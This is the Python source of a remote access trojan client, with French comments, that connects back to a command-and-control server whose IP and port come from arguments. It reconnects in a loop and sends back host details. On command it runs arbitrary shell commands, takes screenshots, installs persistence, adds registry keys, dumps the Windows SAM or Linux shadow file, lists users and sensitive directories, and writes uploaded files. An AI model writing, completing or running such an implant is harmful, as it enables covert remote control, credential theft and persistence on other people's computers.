#Client principal
import socket
import json
import struct
import platform
import argparse
import time
import os

ENCODING ="utf-8"
RETRY_DELAY = 5

#Config host serveur

def parse_args():
    """parser de config server host"""
    p = argparse.ArgumentParser()
    p.add_argument("-ip", required=True, help="IP du serveur")
    p.add_argument("-port", type=int, required=True, help="port du serveur")
    return p.parse_args()

ARGS = parse_args()

SERVER_HOST = ARGS.ip
SERVER_PORT= ARGS.port

os_type = platform.system()

#Detection de l'OS

if os_type == "Windows":
    from modules.win import *
elif os_type == "Linux":
    from modules.lin import *
else:
    print("OS non supporté")
    exit()

#Fonctions primaires du client, envoyer, recevoir des données

def send_msg(sock, payload: dict) -> None:
    """Pour envoyer un json à C2"""
    data = json.dumps(payload).encode(ENCODING)
    sock.sendall(len(data).to_bytes(4, "big") + data)


def send_bytes(sock, blob: bytes, meta: dict) -> None:
    """Pour envoyer les screenshots"""

    send_msg(sock, meta)
    sock.sendall(len(blob).to_bytes(4, "big") + blob)


def _receiveN(sock, n: int) -> bytes | None:
    """Pour lire n octets d'un message de C2"""
    buf = b""
    while len(buf) < n:
        chunk = sock.recv(n - len(buf))
        if not chunk:
            return None
        buf += chunk
    return buf


def receiveBytes(sock) -> bytes:
    raw_len = _receiveN(sock, 4)
    if raw_len is None:
        raise ConnectionError("connexion coupée")
    blob_len = int.from_bytes(raw_len, "big")
    data = _receiveN(sock, blob_len)
    if data is None:
        raise ConnectionError("données incomplètes")
    return data


def receiveMessage(sock) -> dict:
    """Pour recevoir un msg du C2"""

    raw_len = _receiveN(sock, 4)
    if raw_len is None:
        raise ConnectionError("connexion coupée par le serveur")
    
    data = _receiveN(sock, int.from_bytes(raw_len, "big"))

    if data is None:
        raise ConnectionError("connexion interrompue en cours de message")
    return json.loads(data.decode(ENCODING))


#Config des commandes exe


def cmd_screenshot(sock) -> None:
    png = take_screenshot()
    send_bytes(sock, png, {"status": "ok", "format": "png"})


def cmd_sysinfo(sock) -> None:
    send_msg(sock, {"status": "ok", "data": get_sysinfo()})


def cmd_list_users(sock) -> None:
    if os_type == "Windows":
        result = run_shell("net user")
    else:
        result = run_shell("cut -d: -f1 /etc/passwd")
    send_msg(sock, result)



def handle_command(sock, msg: dict):
    """ le client recoit un mot clé du serveur pour la commande à executer, donc si il recoit screenshot alors il executera la fonction screenshot du module associé à l'OS"""
    cmd = msg.get("cmd", "").lower().strip()

    try:
        if cmd == "screenshot":
            cmd_screenshot(sock)

        elif cmd == "sysinfo":
            cmd_sysinfo(sock)

        elif cmd == "shell":
            #Si le C2 envoie une commande a executer, le client pourra la catch grace à ce mot clé
            command = msg.get("command", "")
            result = run_shell(command)          
            send_msg(sock, result)

        elif cmd == "list_users":
            cmd_list_users(sock)

        elif cmd == "ip":
            send_msg(sock, {"status": "ok", "ip": get_real_ip()})

        elif cmd == "persistence":
            result = install_persistence()      
            send_msg(sock, result)

        #Windows
        elif cmd == "sam" and os_type == "Windows":
            result = dump_sam()
            send_msg(sock, result)

        elif cmd == "registry" and os_type == "Windows":
            result = add_registry_key()
            send_msg(sock, result)

        #Linux
        elif cmd == "shadow" and os_type == "Linux":
            result = get_passwd_shadow()
            send_msg(sock, result)

        elif cmd == "list_home" and os_type == "Linux":
            result = list_sensitive_dirs()
            send_msg(sock, result)

        elif cmd == "upload":
            dest = msg.get("dest", ".")
            filename = msg.get("filename", "uploaded_file")
            file_data = receiveBytes(sock)
            filepath = os.path.join(dest, filename)
            os.makedirs(dest, exist_ok=True)
            with open(filepath, "wb") as f:
                f.write(file_data)
            send_msg(sock, {"status": "ok", "message": f"Fichier sauvegardé: {filepath} ({len(file_data)} octets)"})

        else:
            send_msg(sock, {
                "status": "error",
                "message": f"commande inconnue ou non supportée sur {os_type}: {cmd}"
            })

    except Exception as e:
        send_msg(sock, {
            "status": "error",
            "message": str(e)
        })



def main():
    while True:  # le client se reco en boucle au C2
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                sock.connect((SERVER_HOST, SERVER_PORT))
                
                # le client envoit les premieres infos
                send_msg(sock, {
                    "type": "client connecté",
                    "os": os_type,
                    "ip": get_real_ip(),
                    "hostname": platform.node()
                })

                # ecoute en boucle des messages envoyés par C2
                while True:
                    msg = receiveMessage(sock)
                    handle_command(sock, msg)

        except (ConnectionError, ConnectionRefusedError, OSError, json.JSONDecodeError):
            time.sleep(RETRY_DELAY)
        except Exception:
            time.sleep(RETRY_DELAY)


if __name__ == "__main__":
    main()